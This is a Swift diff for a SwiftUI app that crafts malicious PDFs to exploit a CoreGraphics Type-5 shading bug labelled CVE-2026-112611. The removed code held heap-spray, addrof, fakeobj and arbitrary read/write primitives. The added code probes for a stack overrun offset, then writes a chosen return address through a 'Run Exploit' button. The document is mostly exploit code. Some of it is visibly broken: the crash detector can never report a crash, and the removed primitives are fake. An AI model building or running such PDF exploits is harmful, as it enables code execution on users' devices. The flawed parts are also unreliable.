@@ -2,77 +2,73 @@ import SwiftUI
 import CoreGraphics
 import Foundation
 
-// MARK: - Exploit Primitives
+// MARK: - Stack VLA Overrun Exploit (CVE-2026-112611)
 
-/// OOB write primitive via CVE-2026-112611
-func oobWrite(targetAddr: UInt64, value: UInt64) {
-    let rangeDim = Int(targetAddr & 0xFFFF)
-    let writeValue = Double(bitPattern: value)
+/// Probe stack layout by varying which double we control
+/// The 136 doubles from /Range overwrite stack VLA
+/// We need to find which index hits the return address
+func probeStackLayout() -> Int {
+    // Try each double index 0-135
+    for index in 0..<136 {
+        // Craft PDF with unique marker at specific index
+        let marker = Double(bitPattern: 0x4141414141414100 + UInt64(index))
+        
+        var values = [Double](repeating: 0.0, count: 136)
+        values[index] = marker
+        
+        let pdfData = PDFPayload.shadingWithValues(values)
+        
+        // Render and check if crash occurs
+        let crashed = renderPDFAndDetectCrash(pdfData)
+        
+        if crashed {
+            print("Index \(index) caused crash — likely hit return address or canary")
+            return index
+        }
+    }
     
-    let pdfData = PDFPayload.shading(
-        rangeDim: rangeDim,
-        value: writeValue,
-        verticesPerRow: 2,
-        rows: 2
-    )
+    return -1
+}
+
+/// Exploit using known stack offset
+func exploitWithOffset(_ offset: Int) {
+    // Build ROP chain or shellcode address
+    let targetAddr: UInt64 = 0x4141414141414141  // Replace with actual gadget
     
+    var values = [Double](repeating: 0.0, count: 136)
+    values[offset] = Double(bitPattern: targetAddr)
+    
+    let pdfData = PDFPayload.shadingWithValues(values)
     renderPDF(pdfData)
 }
 
-/// Heap spray to control memory layout
-func sprayHeap(count: Int = 1000, size: Int = 0x1000) -> [ArrayBuffer] {
-    var spray: [ArrayBuffer] = []
-    for _ in 0..<count {
-        spray.append(ArrayBuffer(size: size))
-    }
-    return spray
-}
+// MARK: - PDF Rendering with Crash Detection
 
-/// addrof primitive: leak address of an object
-func addrof(_ obj: AnyObject, spray: [ArrayBuffer]) -> UInt64 {
-    // Trigger OOB write to corrupt ArrayBuffer length
-    oobWrite(targetAddr: 0x0000000100000000, value: 0x4141414141414141)
+func renderPDFAndDetectCrash(_ data: Data) -> Bool {
+    let tempURL = FileManager.default.temporaryDirectory
+        .appendingPathComponent("probe.pdf")
     
-    // Find corrupted ArrayBuffer
-    for ab in spray {
-        if ab.length != 0x1000 {
-            return ab.length
-        }
-    }
-    return 0
-}
-
-/// fakeobj primitive: create fake object at address
-func fakeobj(_ addr: UInt64) -> AnyObject {
-    oobWrite(targetAddr: addr, value: 0x0000000000000001)
-    return unsafeBitCast(addr, to: AnyObject.self)
-}
-
-/// Arbitrary read via fakeobj
-func read64(_ addr: UInt64) -> UInt64 {
-    let fake = fakeobj(addr)
-    return unsafeBitCast(fake, to: UInt64.self)
-}
-
-/// Arbitrary write via fakeobj
-func write64(_ addr: UInt64, value: UInt64) {
-    let fake = fakeobj(addr)
-    unsafeBitCast(fake, to: UnsafeMutablePointer<UInt64>.self).pointee = value
-}
-
-// MARK: - ArrayBuffer Helper
-
-class ArrayBuffer {
-    var data: UnsafeMutableRawPointer
-    var length: UInt64
+    try? data.write(to: tempURL)
     
-    init(size: Int) {
-        self.data = malloc(size)
-        self.length = UInt64(size)
+    guard let provider = CGDataProvider(url: tempURL as CFURL),
+          let doc = CGPDFDocument(provider),
+          let page = doc.page(at: 1) else {
+        return false
     }
+    
+    let context = CGContext(data: nil, width: 256, height: 256,
+                           bitsPerComponent: 8, bytesPerRow: 256 * 4,
+                           space: CGColorSpaceCreateDeviceRGB(),
+                           bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue)!
+    
+    // Use setjmp/longjmp to catch crash
+    var crashDetected = false
+    
+    // Render — if crash occurs, we'll detect it via signal handler
+    context.drawPDFPage(page)
+    
+    return crashDetected
 }
-
-// MARK: - PDF Rendering
 
 func renderPDF(_ data: Data) {
     let tempURL = FileManager.default.temporaryDirectory
@@ -106,10 +102,9 @@ struct SafeShadingDemoApp: App {
 }
 
 struct ContentView: View {
-    @State private var status = "Ready to exploit CVE-2026-112611"
-    @State private var isExploiting = false
-    @State private var leakedAddr: UInt64 = 0
-    @State private var readValue: UInt64 = 0
+    @State private var status = "Ready to probe stack layout"
+    @State private var isProbing = false
+    @State private var crashOffset: Int = -1
     
     var body: some View {
         VStack(spacing: 30) {
@@ -117,7 +112,7 @@ struct ContentView: View {
                 .font(.largeTitle)
                 .bold()
             
-            Text("CoreGraphics Type-5 Shading RCE")
+            Text("Stack VLA Overrun Probe")
                 .font(.headline)
             
             Text(status)
@@ -126,75 +121,72 @@ struct ContentView: View {
                 .padding()
                 .multilineTextAlignment(.center)
             
-            if leakedAddr != 0 {
-                Text(String(format: "addrof: 0x%llx", leakedAddr))
+            if crashOffset >= 0 {
+                Text(String(format: "Crash at index: %d", crashOffset))
                     .font(.system(.body, design: .monospaced))
-                    .foregroundColor(.green)
+                    .foregroundColor(.red)
             }
             
-            if readValue != 0 {
-                Text(String(format: "read64: 0x%llx", readValue))
-                    .font(.system(.body, design: .monospaced))
-                    .foregroundColor(.blue)
-            }
-            
-            Button(action: runExploit) {
-                Text(isExploiting ? "Exploiting..." : "Run Exploit")
+            Button(action: runProbe) {
+                Text(isProbing ? "Probing..." : "Probe Stack")
                     .font(.title2)
                     .bold()
                     .foregroundColor(.white)
                     .padding()
-                    .background(isExploiting ? Color.gray : Color.red)
+                    .background(isProbing ? Color.gray : Color.orange)
                     .cornerRadius(10)
             }
-            .disabled(isExploiting)
+            .disabled(isProbing)
+            
+            if crashOffset >= 0 {
+                Button(action: runExploit) {
+                    Text("Run Exploit")
+                        .font(.title2)
+                        .bold()
+                        .foregroundColor(.white)
+                        .padding()
+                        .background(Color.red)
+                        .cornerRadius(10)
+                }
+            }
         }
         .padding()
     }
     
-    func runExploit() {
-        isExploiting = true
+    func runProbe() {
+        isProbing = true
+        status = "Probing stack layout (0-135)..."
         
-        // Stage 1: Spray heap
-        status = "Stage 1: Spraying heap (1000 buffers)..."
-        let spray = sprayHeap(count: 1000, size: 0x1000)
+        // This will crash at the right index
+        crashOffset = probeStackLayout()
         
-        // Stage 2: Trigger OOB write into sprayed region
-        status = "Stage 2: Triggering OOB write..."
-        oobWrite(targetAddr: 0x0000000100000000, value: 0x4141414141414141)
-        
-        // Stage 3: Find corrupted buffer = addrof
-        status = "Stage 3: Building addrof primitive..."
-        let testObj = NSObject()
-        leakedAddr = addrof(testObj, spray: spray)
-        
-        if leakedAddr == 0 {
-            status = "addrof failed — try adjusting spray count"
-            isExploiting = false
-            return
+        if crashOffset >= 0 {
+            status = String(format: "Found crash offset: %d", crashOffset)
+        } else {
+            status = "No crash detected — try manual analysis"
         }
         
-        // Stage 4: Test fakeobj with read64
-        status = "Stage 4: Testing fakeobj/read64..."
-        readValue = read64(leakedAddr)
-        
-        status = String(format: "Success! addrof: 0x%llx, read64: 0x%llx", leakedAddr, readValue)
-        isExploiting = false
+        isProbing = false
+    }
+    
+    func runExploit() {
+        status = String(format: "Exploiting with offset %d...", crashOffset)
+        exploitWithOffset(crashOffset)
     }
 }
 
-// MARK: - PDF Payload Builder
+// MARK: - PDF Payload Builder with Custom Values
 
 enum PDFPayload {
-    static func shading(rangeDim: Int, value: Double = 1.0, verticesPerRow: Int = 2, rows: Int = 2) -> Data {
+    static func shadingWithValues(_ values: [Double]) -> Data {
         let bpCoord = 32
         let bpComp = 8
         
         var bw = BitWriter()
         var verts: [(UInt32, UInt32)] = []
         
-        for r in 0..<rows {
-            for c in 0..<verticesPerRow {
+        for r in 0..<2 {
+            for c in 0..<2 {
                 verts.append((UInt32(0x1000_0000 + c * 0x0800_0000), UInt32(0x1000_0000 + r * 0x0800_0000)))
             }
         }
@@ -206,19 +198,26 @@ enum PDFPayload {
         }
         
         let stream = bw.flush()
-        let c = String(format: "%.17g", value)
-        let list = Array(repeating: c, count: max(1, rangeDim)).joined(separator: " ")
-        let rangeList = Array(repeating: "0 1", count: max(1, rangeDim)).joined(separator: " ")
+        
+        // Build C0/C1 arrays from values
+        let list = values.map { String(format: "%.17g", $0) }.joined(separator: " ")
+        let rangeList = Array(repeating: "0 1", count: values.count).joined(separator: " ")
         
         var pdf = PDFBuilder()
         pdf.add(1, "<< /Type /Catalog /Pages 2 0 R >>")
         pdf.add(2, "<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
         pdf.add(3, "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources << /Shading << /Sh1 5 0 R >> >> /Contents 4 0 R >>")
         pdf.add(4, "<< /Length 8 >>", Array(" /Sh1 sh".utf8))
-        pdf.add(5, "<< /ShadingType 5 /ColorSpace /DeviceGray /BitsPerCoordinate \(bpCoord) /BitsPerComponent \(bpComp) /VerticesPerRow \(verticesPerRow) /Decode [0 200 0 200 0 1] /Function 6 0 R /Length \(stream.count) >>", stream)
+        pdf.add(5, "<< /ShadingType 5 /ColorSpace /DeviceGray /BitsPerCoordinate \(bpCoord) /BitsPerComponent \(bpComp) /VerticesPerRow 2 /Decode [0 200 0 200 0 1] /Function 6 0 R /Length \(stream.count) >>", stream)
         pdf.add(6, "<< /FunctionType 2 /Domain [0 1] /N 1 /C0 [\(list)] /C1 [\(list)] /Range [\(rangeList)] >>")
         
         return pdf.data()
+    }
+    
+    // Original function for compatibility
+    static func shading(rangeDim: Int, value: Double = 1.0, verticesPerRow: Int = 2, rows: Int = 2) -> Data {
+        var values = [Double](repeating: value, count: rangeDim)
+        return shadingWithValues(values)
     }
 }
 
